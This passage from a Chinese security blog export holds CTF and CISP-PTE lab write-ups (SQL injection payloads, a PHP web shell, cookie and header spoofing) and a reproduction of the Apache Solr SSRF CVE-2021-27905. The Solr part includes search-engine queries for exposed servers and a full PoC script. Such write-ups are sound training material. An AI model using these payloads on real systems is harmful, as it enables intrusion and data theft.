<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const parse = (str) =&gt; &#123;</span><br><span class="line">  const pkey = `-----BEGIN PUBLIC KEY-----</span><br><span class="line">  MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIk4a0KYnqOLmJPxNGQkotihoo</span><br><span class="line">  994QXmk+7M8WCS5U7kWdhfMqiyjpKzuMaRB8Aydo2bbTNjHhATTRTUIvlpqNzEob</span><br><span class="line">  CSWuNFc3j3Nlk/I5ySdFo0INzlHnJtbwKQoHon0ctmyffovYNg5Ar8LPz6RbsiA7</span><br><span class="line">  3Ic4McekZIkdJH08cwIDAQAB</span><br><span class="line">  -----END PUBLIC KEY-----`;</span><br><span class="line">  const jsEncrypt = new JSEncrypt()</span><br><span class="line">  jsEncrypt.setPublicKey(pkey);</span><br><span class="line">  const data = jsEncrypt.encrypt(str);</span><br><span class="line">  const result = window.btoa(data)</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">parse(&quot;payload&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>查询数据库版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parse(&quot;&#x27; UNION SELECT SQLITE_VERSION() &#x27;&quot;)</span><br><span class="line">// cVlHc25oQ3Y0NGRPV1JEaG56cFBEYWJEZzZqK0VJWjBkdHlnbk9WTU5sQmU4aWVFb3JWekN5clJtb081VFVXT2VWZTBpYjJGUy8va29EZGZSOGJpc0h2UkNJdVJ3bXVKWnVBOUhRTWxKYSs4MS9LR0hiSUpxL0VFY1BqMWFOdFVXbGsrcG9OMzlOL0xrTzBtT1h4T09kanVVVVNPMkZVam9CSnFIRFJrV3VjPQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">getscorewithname(name:&quot;cVlHc25oQ3Y0NGRPV1JEaG56cFBEYWJEZzZqK0VJWjBkdHlnbk9WTU5sQmU4aWVFb3JWekN5clJtb081VFVXT2VWZTBpYjJGUy8va29EZGZSOGJpc0h2UkNJdVJ3bXVKWnVBOUhRTWxKYSs4MS9LR0hiSUpxL0VFY1BqMWFOdFVXbGsrcG9OMzlOL0xrTzBtT1h4T09kanVVVVNPMkZVam9CSnFIRFJrV3VjPQ==&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329150800668.png" class title="image-20220329150800668">



<p>构造查询数据获取表名flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT (SELECT flag from flag)&#x27;</span><br><span class="line">//SzJYbWZzc29ackpCQWY1SFZPS2ZFZjlnbW5mRk5tV3V1dWp3bnhtcTFLTDc5TkhDenZKcXQybm90VmVKM2F1QjdISkVlS0piaDRkdXJyMXVPVmtTRUVGYjN1Q0JUUE9vblFNNlBqVk1qb0RUR1ZBbTd2OGtXbWxseXFkckR2UlhsTStLYXlTcCtJaHRKSjNrSm9jNlNXM3pJTzFBOGNMeEY2ckZsUDYyKzVFPQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;SzJYbWZzc29ackpCQWY1SFZPS2ZFZjlnbW5mRk5tV3V1dWp3bnhtcTFLTDc5TkhDenZKcXQybm90VmVKM2F1QjdISkVlS0piaDRkdXJyMXVPVmtTRUVGYjN1Q0JUUE9vblFNNlBqVk1qb0RUR1ZBbTd2OGtXbWxseXFkckR2UlhsTStLYXlTcCtJaHRKSjNrSm9jNlNXM3pJTzFBOGNMeEY2ckZsUDYyKzVFPQ==&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>得到flag为：flag{Rea1_flag_1s_Me}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>-CTF -Web -Graphql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CISP-PTE综合实验靶场</title>
    <url>/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="CISP-PTE综合实验靶场"><a href="#CISP-PTE综合实验靶场" class="headerlink" title="CISP-PTE综合实验靶场"></a>CISP-PTE综合实验靶场</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>这道题是insert注入，在文章发布功能中插入paylaod，然后在文章查看中观察插入的文章payload是否执行。</p>
<p>在标题和内容中输入任意字符</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627150058769.png" class title="image-20220627150058769">



<p>执行的SQL语句如下：</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627150130557.png" class title="image-20220627150130557">



<p>查看发表的文章结果如下</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627150153385.png" class title="image-20220627150153385">



<p>由于在SQL语句中insert操作语法为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into xxxx values(&#x27;x&#x27;,&#x27;x&#x27;,&#x27;x&#x27;,&#x27;x&#x27;)</span><br><span class="line">注：values()可以有多个值</span><br></pre></td></tr></table></figure>



<p>题目将标题和内容都拼接进SQL语句进行插入，我们先测试标题和内容是否为注入点，在标题中输入paylaod。由于插入语句中有’’单引号使得payload变成了字符串，无法进行查询。如下：</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627152310057.png" class title="image-20220627152310057">



<p>所以我们需要构造一个payload逃脱单引号的引用，这里通过使用两个values()，在values()中输入无需引用的payload即可。</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627151536538.png" class title="image-20220627151536538">

<p>插入语句如下：</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627151553138.png" class title="image-20220627151553138">

<p>可以看到回显的是在内容payload的5和6a这两个字符串</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627151617642.png" class title="image-20220627151617642">



<p>将这两个字符串位置修改为SQL查询语句，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">1&#x27;,&#x27;2</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">3&#x27;),(&#x27;4&#x27;,(select/**/database()),&#x27;6</span><br></pre></td></tr></table></figure>

<p>插入的SQL语句如下所示。</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627153328372.png" class title="image-20220627153328372">

<p>可以查询到数据库名称为2Web</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627153441329.png" class title="image-20220627153441329">

<p>构造payload,查询数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">1&#x27;,&#x27;2</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">3&#x27;),(&#x27;4&#x27;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;2web&#x27;),&#x27;6</span><br></pre></td></tr></table></figure>

<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627153808816.png" class title="image-20220627153808816">

<p>查询获取到2web数据库下的数据表</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627153840433.png" class title="image-20220627153840433">



<p>要想获取到KEY值需要查询user1数据表的数据，构造paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">1&#x27;,&#x27;2</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">3&#x27;),(&#x27;4&#x27;,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;users1&#x27;),&#x27;6</span><br></pre></td></tr></table></figure>

<p>插入语句如下</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627154311497.png" class title="image-20220627154311497">

<p>获取到users1数据表下username、password列</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627154337096.png" class title="image-20220627154337096">



<p>接下来就是查询这两个字段的值来获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标题：</span><br><span class="line">1&#x27;,&#x27;2</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">3&#x27;),(&#x27;4&#x27;,(select/**/group_concat(username,password)/**/from/**/users1),&#x27;6</span><br></pre></td></tr></table></figure>

<p>获取到所有的用户以及其密码，可以看到key值{u9y8tr4n}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627154917671.png" class title="image-20220627154917671">

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>这道题只需绕过前端的后缀检验和头文件检验即可。</p>
<p>构造php文件，先将后缀修改为jpg绕过前端检验后使用Burp拦截修改后缀名称上传成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php system($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627155911772.png" class title="image-20220627155911772">



<p>访问上传文件验证命令执行，如下</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627161012617.png" class title="image-20220627161012617">



<p>获取其key值为{a1b2c3d4}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627161223940.png" class title="image-20220627161223940">

<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>可以观察到题目自动添加后缀txt获取文件，只能通过加载已有的txt文本文件才能读取成功</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627162045311.png" class title="image-20220627162045311">

<p>使用文件上传漏洞上传个php执行代码的txt文件，获取key.php路径</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627162528951.png" class title="image-20220627162528951">



<p>读取key.php文件，key值为{abcdefgh}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627162625774.png" class title="image-20220627162625774">

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>源代码意思是将HTTP请求中的str参数进行反序列化，若与TEMP变量相等则输出key值，所以需要构造str参数为序列化</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627162918270.png" class title="image-20220627162918270">



<p>TEMP变量值为”Whatever is worth doing is worth doing well.”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:44:&quot;Whatever is worth doing is worth doing well.&quot;;</span><br></pre></td></tr></table></figure>

<p>获取key值为{12345678}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627163300810.png" class title="image-20220627163300810">

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>这道题从strtolower()函数中”$a”下手，由于双引号内都为字符串，所以要要获取命令执行结果，必要在双引号转换之间就获取命令执行结果。</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627164625769.png" class title="image-20220627164625769">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=$&#123;system($_POST[&#x27;cmd&#x27;])&#125;</span><br></pre></td></tr></table></figure>

<p>返回当前目录文件，存在key4.php</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627171408432.png" class title="image-20220627171408432">



<p>读取key4.php</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627171531342.png" class title="image-20220627171531342">



<p>获取key值为{12345678}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627171543914.png" class title="image-20220627171543914">

<h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>题目提示使用admin用户权限获取key值</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627163407509.png" class title="image-20220627163407509">

<p>点击开始答题后，显示NO</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627163451778.png" class title="image-20220627163451778">

<p>我们使用Burp抓包拦截请求，Cookie字段中isAdmin属性为false，Username属性为Guest的BASE64编码</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627163738148.png" class title="image-20220627163738148">

<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627163843883.png" class title="image-20220627163843883">



<p>修改Cookie字段中的isAdmin属性为true，Username属性为admin，转换为base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=ap1785nughn7vq798827m3n5ic; IsAdmin=true; Username=YWRtaW4%3D</span><br></pre></td></tr></table></figure>

<p>此时还是显示只允许本地访问，这里我们还得修改HTTP请求中的请求IP，由x-forwarded-for决定。</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627164116561.png" class title="image-20220627164116561">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x-forwarded-for: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>获取到key值，{12345678}</p>
<img src="/2022/06/27/CISP-PTE%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E9%9D%B6%E5%9C%BA/image-20220627164240722.png" class title="image-20220627164240722">]]></content>
      <categories>
        <category>证书</category>
        <category>cisp-pte</category>
      </categories>
      <tags>
        <tag>-考证 -cisp-pte -Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache-Solr-SSRF漏洞(CVE-2021-27905)复现</title>
    <url>/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Apache-Solr-SSRF漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache-Solr-SSRF漏洞(CVE-2021-27905)复现"></a>Apache-Solr-SSRF漏洞(CVE-2021-27905)复现</h1><hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115202638792.png" class title="image-20211115202638792">



<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>

<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115203019066.png" class title="image-20211115203019066">



<p>在浏览器上访问8983端口，可以看到Solr</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115203118220.png" class title="image-20211115203118220">



<p>下面我们为Solr创建Core</p>
<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115203546935.png" class title="image-20211115203546935">



<p>我们来看下报错信息，如下:</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115203923524.png" class title="image-20211115203923524">

<p>提示没找到solrconfig.xml文件在配置文件中。</p>
<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115204058647.png" class title="image-20211115204058647">



<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115204355418.png" class title="image-20211115204355418">



<p>再次进行创建Core,成功创建</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115204436984.png" class title="image-20211115204436984">



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
<p>FOFA查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>



<p>Zoomeye查询:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>



<p>下面开始对Solr进行漏洞探测.</p>
<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>

<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115204811720.png" class title="image-20211115204811720">



<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
<p>poc格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>



<p>设置URL为DNSlog平台地址，可以看到返回200</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>

<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115211804407.png" class title="image-20211115211804407">



<p>在Dnslog平台上可以看到有请求响应</p>
<img src="/2021/11/09/Apache-Solr-SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/image-20211115211947915.png" class title="image-20211115211947915">



<p>这里提供一个poc脚本；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>



<p>使用方法；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>



<p>我们来运行一下该poc脚本:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>

<p>提示目标系统可能存在SSRF漏洞</p>
